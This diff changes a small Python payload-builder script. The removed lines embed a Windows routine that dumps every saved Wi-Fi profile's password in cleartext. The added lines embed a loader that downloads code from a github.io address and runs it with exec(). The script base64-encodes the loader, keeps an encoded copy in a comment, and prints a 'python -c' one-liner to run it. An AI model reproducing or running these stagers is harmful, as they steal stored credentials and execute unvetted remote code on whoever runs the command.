@@ -1,28 +1,17 @@
-script = """import subprocess
-import concurrent.futures
-
-data = subprocess.check_output(['netsh','wlan','show','profiles']).decode(errors='replace').split('\n')
-profiles =[i.split(':')[1][1:-1] for i in data if "All User Profile" in i]
-print(profiles)
-with concurrent.futures.ThreadPoolExecutor(max_workers=100) as e:
-    for hostinfo in e.map(lambda i: print(i +'='+ [b.split(':')[1][1:-1] for b in subprocess.check_output(['netsh','wlan','show','profiles',i,'key=clear']).decode(errors='replace').split('\n') if 'Key Content' in b][0] + '\n',end=''), profiles):
-        pass
-input()
+import base64
+code = """import sys, base64
+u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',))
+r=u.urlopen("https://sl33pypanda.github.io/mi1stRepo/nescesito.txt")
+exec(r.read())
 """
+script = base64.b64encode(code.encode())
+
+#script = b'aW1wb3J0IHN5cwp1PV9faW1wb3J0X18oJ3VybGxpYicrezI6JycsMzonLnJlcXVlc3QnfVtzeXMudmVyc2lvbl9pbmZvWzBdXSxmcm9tbGlzdD0oJ3VybG9wZW4nLCkpCnI9dS51cmxvcGVuKCJodHRwczovL3NsMzNweXBhbmRhLmdpdGh1Yi5pby9taTFzdFJlcG8vbmVzY2VzaXRvLnR4dCIpCmV4ZWMoci5yZWFkKCkpCg=='
 
 
-ret = script.replace("'\n'","'\\\\n'") # deal with some case like split('\n')
 
-ret = ret.replace('\n','\\n')
-ret = ret.replace('    ','\\t')
 
-# level 1 escape sequence
-ret = ret.replace('"','\\"') 
+print('python -c "import base64;exec(base64.b64decode(',end='')
+print(script,end='')
+print( ').decode())"')
 
-# level 2 escape sequence
-ret = ret.replace('\\"','\\\\\\"') 
-
-##ret = ret.replace('\\','\\\\')
-ret = 'exec(\\"' + ret + '\\")'
-
-print('python -c "' + ret + '"')
